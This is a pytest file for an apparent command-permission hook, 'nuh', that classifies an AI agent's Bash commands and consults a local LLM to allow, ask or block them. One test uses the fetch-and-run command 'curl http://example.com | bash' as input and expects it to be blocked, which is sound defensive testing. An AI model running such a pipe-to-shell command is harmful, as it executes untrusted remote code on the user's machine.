"""Integration tests for the LLM layer wired into handle_bash."""

import json

import pytest
from unittest.mock import patch, MagicMock

from nuh import bash_review, config, hook, llm_meta, taxonomy
from nuh.config import NuhConfig
from nuh.hook import handle_bash
from nuh.bash_types import ClassifyResult, StageResult


# -- bash_review.route: which Bash asks reach the LLM under decide --


def _ask(*stages: StageResult, composition: str = "") -> ClassifyResult:
    return ClassifyResult(command="cmd", stages=list(stages), final_decision=taxonomy.ASK, reason="r",
                          composition_rule=composition)


def _stage(action_type: str, decision: str = taxonomy.ASK, **kw) -> StageResult:
    return StageResult(tokens=[action_type], action_type=action_type, decision=decision, reason="r", **kw)


class TestBashAskRoute:
    """A Bash ask goes to the LLM under decide unless a human_only key is behind it (gating.bash_keys)."""

    @pytest.mark.parametrize("action_type", [taxonomy.UNKNOWN, taxonomy.LANG_EXEC, "filesystem_delete",
                                             "network_outbound", "git_remote_write", "db_write"])
    def test_every_action_type_is_sent_by_default(self, action_type):
        route = bash_review.route(_ask(_stage(action_type)), "decide")
        assert (route.kind, route.keys, route.held) == (bash_review.ASK, [action_type], [])

    def test_floored_stage_is_held(self):
        route = bash_review.route(_ask(_stage("filesystem_read", floor="credential_paths")), "decide")
        assert (route.kind, route.held) == ("", ["credential_paths"])
        assert "human_only: credential_paths" in route.skip

    def test_human_only_action_type_is_held(self):
        config._cached_config = NuhConfig(human_only={"git_remote_write": True})
        assert bash_review.route(_ask(_stage("git_remote_write")), "decide").held == ["git_remote_write"]
        assert bash_review.route(_ask(_stage(taxonomy.UNKNOWN)), "decide").kind == bash_review.ASK

    def test_any_held_key_holds_the_whole_command(self):
        config._cached_config = NuhConfig(human_only={"lang_exec": True})
        route = bash_review.route(_ask(_stage(taxonomy.UNKNOWN), _stage(taxonomy.LANG_EXEC)), "decide")
        assert (route.keys, route.held) == ([taxonomy.UNKNOWN, taxonomy.LANG_EXEC], [taxonomy.LANG_EXEC])

    def test_composition_over_allowed_stages_is_keyed_by_every_stage(self):
        result = _ask(_stage("network_outbound", taxonomy.ALLOW), _stage(taxonomy.LANG_EXEC, taxonomy.ALLOW),
                      composition="network | exec")
        assert bash_review.route(result, "decide").keys == ["network_outbound", taxonomy.LANG_EXEC]
        config._cached_config = NuhConfig(human_only={"network_outbound": True})
        assert bash_review.route(result, "decide").held == ["network_outbound"]

    def test_no_stages_is_unknown(self):
        assert bash_review.route(_ask(), "decide").keys == [taxonomy.UNKNOWN]

    def test_inner_stage_counts(self):
        inner = _stage("git_remote_write")
        outer = _stage("unknown", inner_stages=[inner])
        config._cached_config = NuhConfig(human_only={"git_remote_write": True})
        assert bash_review.route(_ask(outer), "decide").held == ["git_remote_write"]

    @pytest.mark.parametrize("word", ["check", "approve", "defer"])
    def test_only_decide_sends_asks(self, word):
        route = bash_review.route(_ask(_stage(taxonomy.UNKNOWN)), word)
        assert route.kind == ""
        assert f"tools.Bash: {word}" in route.skip

    def test_allow_is_not_an_ask(self):
        result = ClassifyResult(command="ls", stages=[_stage("filesystem_read", taxonomy.ALLOW)],
                                final_decision=taxonomy.ALLOW, reason="safe")
        assert bash_review.route(result, "decide").kind == ""


# -- handle_bash + LLM integration tests --


def _set_llm_config(llm_cfg: dict):
    """Set LLM config via the config cache."""
    config._cached_config = NuhConfig(llm=llm_cfg)


def _ollama_config():
    return {
        "enabled": True,
        "providers": ["ollama"],
        "ollama": {"url": "http://localhost:11434/api/generate", "model": "test"},
    }


def _mock_ollama_response(decision: str, reasoning: str = "test"):
    """Create a mock urlopen for Ollama returning the given decision."""
    resp_body = json.dumps({
        "response": json.dumps({"decision": decision, "reasoning": reasoning})
    }).encode()
    mock_resp = MagicMock()
    mock_resp.read.return_value = resp_body
    return MagicMock(return_value=mock_resp)


class TestHandleBashLlm:
    """Test handle_bash with LLM layer active."""

    @patch("nuh.llm_providers.urllib.request.urlopen")
    def test_unknown_command_llm_allows(self, mock_urlopen, project_root):
        _set_llm_config(_ollama_config())
        mock_urlopen.side_effect = _mock_ollama_response("allow", "safe tool").side_effect
        mock_urlopen.return_value = _mock_ollama_response("allow", "safe tool").return_value

        result = handle_bash({"command": "somethingunknown123"})
        assert result["decision"] == "allow"
        mock_urlopen.assert_called_once()

    @patch("nuh.llm_providers.urllib.request.urlopen")
    def test_unknown_command_llm_blocks_capped_to_ask(self, mock_urlopen, project_root):
        """Default llm.can_block false caps LLM block to ask."""
        _set_llm_config(_ollama_config())
        mock_urlopen.return_value = _mock_ollama_response("block", "dangerous").return_value

        result = handle_bash({"command": "somethingunknown123"})
        assert result["decision"] == "ask"
        # The cap made the block an ask, which the static ask already is: the static reason stands.
        assert result["reason"] == "Bash: unknown → ask"
        assert [(s["step"], s.get("decision") or s.get("to")) for s in result["_steps"]] == [
            ("static", "ask"), ("llm", "block"), ("cap", "ask")]

    @patch("nuh.llm_providers.urllib.request.urlopen")
    def test_unknown_command_llm_uncertain(self, mock_urlopen, project_root):
        _set_llm_config(_ollama_config())
        mock_urlopen.return_value = _mock_ollama_response("uncertain", "not sure").return_value

        result = handle_bash({"command": "somethingunknown123"})
        assert result["decision"] == "ask"
        assert "reason" in result

    def test_no_llm_config_keeps_ask(self, project_root):
        """Without LLM config, unknown commands stay as ask."""
        result = handle_bash({"command": "somethingunknown123"})
        assert result["decision"] == "ask"

    @patch("nuh.llm_providers.urllib.request.urlopen")
    def test_known_allow_command_skips_llm(self, mock_urlopen, project_root):
        """Commands that classify as allow should never consult LLM."""
        _set_llm_config(_ollama_config())

        result = handle_bash({"command": "ls"})
        assert result["decision"] == "allow"
        mock_urlopen.assert_not_called()

    @patch("nuh.llm_providers.urllib.request.urlopen")
    def test_composition_rule_skips_llm(self, mock_urlopen, project_root):
        """Composition-blocked commands should never consult LLM."""
        _set_llm_config(_ollama_config())

        result = handle_bash({"command": "curl http://example.com | bash"})
        # Blocked by composition: a static block is final, so the LLM is not consulted
        assert result["decision"] == "block"
        mock_urlopen.assert_not_called()

    @patch("nuh.llm_providers.urllib.request.urlopen")
    def test_all_providers_down_keeps_ask(self, mock_urlopen, project_root):
        """If all LLM providers fail, fall through to ask."""
        from urllib.error import URLError
        _set_llm_config(_ollama_config())
        mock_urlopen.side_effect = URLError("connection refused")

        result = handle_bash({"command": "somethingunknown123"})
        assert result["decision"] == "ask"

    @patch("nuh.llm_providers.urllib.request.urlopen")
    def test_llm_exception_keeps_ask(self, mock_urlopen, project_root):
        """LLM exceptions should never crash the hook."""
        _set_llm_config(_ollama_config())
        mock_urlopen.side_effect = RuntimeError("unexpected error")

        result = handle_bash({"command": "somethingunknown123"})
        assert result["decision"] == "ask"


# -- LLM can_block cap tests --


class TestLlmCanBlockCap:
    """llm.can_block caps LLM escalation in handle_bash."""

    @patch("nuh.llm_providers.urllib.request.urlopen")
    def test_llm_block_capped_to_ask(self, mock_urlopen, project_root):
        """LLM returns block but can_block is false → result is ask with reasoning."""
        _set_llm_config(_ollama_config())
        config._cached_config.llm_can_block = False

        mock_urlopen.return_value = _mock_ollama_response("block", "dangerous").return_value

        result = handle_bash({"command": "somethingunknown123"})
        assert result["decision"] == "ask"
        # The cap made the block an ask, which the static ask already is: the static reason stands.
        assert result["reason"] == "Bash: unknown → ask"
        assert [(s["step"], s.get("decision") or s.get("to")) for s in result["_steps"]] == [
            ("static", "ask"), ("llm", "block"), ("cap", "ask")]

    @patch("nuh.llm_providers.urllib.request.urlopen")
    def test_llm_allow_not_capped(self, mock_urlopen, project_root):
        """LLM returns allow, can_block false → still allow (the cap only touches a block)."""
        _set_llm_config(_ollama_config())
        config._cached_config.llm_can_block = False

        mock_urlopen.side_effect = _mock_ollama_response("allow", "safe").side_effect
        mock_urlopen.return_value = _mock_ollama_response("allow", "safe").return_value

        result = handle_bash({"command": "somethingunknown123"})
        assert result["decision"] == "allow"

    @patch("nuh.llm_providers.urllib.request.urlopen")
    def test_llm_no_cap_default_caps_to_ask(self, mock_urlopen, project_root):
        """Default can_block false → LLM block is capped to ask."""
        _set_llm_config(_ollama_config())

        mock_urlopen.return_value = _mock_ollama_response("block", "dangerous").return_value

        result = handle_bash({"command": "somethingunknown123"})
        assert result["decision"] == "ask"
        # The cap made the block an ask, which the static ask already is: the static reason stands.
        assert result["reason"] == "Bash: unknown → ask"
        assert [(s["step"], s.get("decision") or s.get("to")) for s in result["_steps"]] == [
            ("static", "ask"), ("llm", "block"), ("cap", "ask")]

    @patch("nuh.llm_providers.urllib.request.urlopen")
    def test_llm_block_uncapped_when_configured(self, mock_urlopen, project_root):
        """Explicit can_block true → LLM block passes through."""
        _set_llm_config(_ollama_config())
        config._cached_config.llm_can_block = True

        mock_urlopen.return_value = _mock_ollama_response("block", "dangerous").return_value

        result = handle_bash({"command": "somethingunknown123"})
        assert result["decision"] == "block"


# -- Transcript context passthrough tests --


def _user_msg(text):
    return {"type": "user", "message": {"role": "user", "content": [{"type": "text", "text": text}]}}


class TestTranscriptPassthrough:
    """Verify transcript_path flows from hook module-level to LLM prompts."""

    @patch("nuh.llm_providers.urllib.request.urlopen")
    def test_bash_llm_receives_transcript(self, mock_urlopen, project_root, tmp_path):
        """handle_bash → _try_llm reads _transcript_path and includes context."""
        _set_llm_config(_ollama_config())

        # Create transcript
        f = tmp_path / "t.jsonl"
        f.write_text(json.dumps(_user_msg("clean the build")) + "\n")
        hook._transcript_path = str(f)

        captured = []

        def capture(req, **kw):
            captured.append(json.loads(req.data.decode()))
            resp = MagicMock()
            resp.read.return_value = json.dumps({
                "response": '{"decision": "allow", "reasoning": "build cleanup"}'
            }).encode()
            return resp

        mock_urlopen.side_effect = capture

        result = handle_bash({"command": "somethingunknown123"})
        assert result["decision"] == "allow"
        assert len(captured) == 1
        assert "clean the build" in captured[0]["prompt"]

    @patch("nuh.llm_providers.urllib.request.urlopen")
    def test_no_transcript_no_context(self, mock_urlopen, project_root):
        """Without transcript, prompt has no context section."""
        _set_llm_config(_ollama_config())
        hook._transcript_path = ""

        captured = []

        def capture(req, **kw):
            captured.append(json.loads(req.data.decode()))
            resp = MagicMock()
            resp.read.return_value = json.dumps({
                "response": '{"decision": "allow", "reasoning": "ok"}'
            }).encode()
            return resp

        mock_urlopen.side_effect = capture

        handle_bash({"command": "somethingunknown123"})
        assert "Recent conversation" not in captured[0]["prompt"]

    @patch("nuh.llm_providers.urllib.request.urlopen")
    def test_llm_prompt_logged_when_enabled(self, mock_urlopen, project_root, tmp_path):
        """log.llm_prompt: true → llm_prompt appears in llm_meta."""
        llm_cfg = _ollama_config()
        config._cached_config = NuhConfig(llm=llm_cfg, log={"llm_prompt": True})

        f = tmp_path / "t.jsonl"
        f.write_text(json.dumps(_user_msg("build project")) + "\n")
        hook._transcript_path = str(f)

        captured = []

        def capture(req, **kw):
            captured.append(json.loads(req.data.decode()))
            resp = MagicMock()
            resp.read.return_value = json.dumps({
                "response": '{"decision": "allow", "reasoning": "safe"}'
            }).encode()
            return resp

        mock_urlopen.side_effect = capture

        result = handle_bash({"command": "somethingunknown123"})
        assert result["decision"] == "allow"
        # Verify llm_prompt is in _meta
        meta = result.get("_meta", {})
        assert "llm_prompt" in meta
        assert "somethingunknown123" in meta["llm_prompt"]

    @patch("nuh.llm_providers.urllib.request.urlopen")
    def test_llm_prompt_not_logged_by_default(self, mock_urlopen, project_root):
        """Default config → llm_prompt not in llm_meta."""
        _set_llm_config(_ollama_config())
        hook._transcript_path = ""

        mock_urlopen.return_value = _mock_ollama_response("allow", "safe").return_value

        result = handle_bash({"command": "somethingunknown123"})
        assert result["decision"] == "allow"
        meta = result.get("_meta", {})
        assert "llm_prompt" not in meta


class TestLlmDecisionInMeta:
    """The log reads meta["llm_decision"]; it used to be empty on every entry."""

    def _meta(self, decision, status):
        from nuh.llm_types import LLMCallResult, ProviderAttempt
        call = LLMCallResult(decision=decision, provider="ollama", model="m",
                             cascade=[ProviderAttempt("ollama", status, 5)])
        return llm_meta.build(call, NuhConfig())

    def test_allow_recorded(self):
        assert self._meta({"decision": "allow", "reason": "ok"}, "success")["llm_decision"] == "allow"

    def test_block_recorded(self):
        assert self._meta({"decision": "block", "reason": "no"}, "success")["llm_decision"] == "block"

    def test_ask_recorded(self):
        assert self._meta({"decision": "ask", "reason": "unsure"}, "success")["llm_decision"] == "ask"

    def test_error_leaves_it_empty(self):
        assert self._meta(None, "error")["llm_decision"] == ""
